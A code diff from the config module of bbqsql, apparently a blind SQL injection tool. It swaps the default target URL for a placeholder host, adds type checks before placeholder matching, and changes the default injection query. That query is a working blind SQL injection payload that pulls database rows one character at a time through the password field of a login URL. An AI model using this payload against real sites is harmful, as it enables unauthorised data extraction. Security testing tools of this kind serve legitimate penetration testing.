@@ -174,7 +174,7 @@ class RequestsConfig:
             'validator':None},\
         'url':\
             {'name':'url',\
-            'value':'http://192.168.1.254/index.php?username=user1&password=secret${injection}',\
+            'value':'http://sqlivuln/index.php?username=user1&password=secret${injection}',\
             'description':'The URL that requests should be sent to.',\
             'types':[str,Query],\
             'required':True,\
@@ -191,10 +191,10 @@ class RequestsConfig:
             
             elif type(thing['value']) == dict:
                 for key in thing['value']:
-                    if re.match(u'\$\{.+\}',key):
+                    if type(key) == str and re.match(u'\$\{.+\}',key):
                         thing['value'][Query(key,encoder=quote)] = thing['value'][key]
                         del(thing['value'][key])
-                    if re.match(u'\$\{.+\}',thing['value'][key]):
+                    if type(thing['value'][key]) == str and re.match(u'\$\{.+\}',thing['value'][key]):
                         thing['value'][key] = Quote(thing['value'][key],encoder=quote)
 
 
@@ -377,7 +377,7 @@ class bbqsqlConfig(RequestsConfig):
             'validator':validate_search_type},\
         'query':\
             {'name':'query',\
-            'value':"' and ASCII(SUBSTR((SELECT data FROM data LIMIT 1 OFFSET ${row_index:1}),${char_index:1},1))${comparator:>}${char_val:0} or 'b'='a",\
+            'value':"' and ASCII(SUBSTR((SELECT data FROM data LIMIT 1 OFFSET ${row_index:1}),${char_index:1},1))${comparator:>}${char_val:0} #",\
             'description':text.query_text,\
             'types':[str,Query],\
             'required':True,\
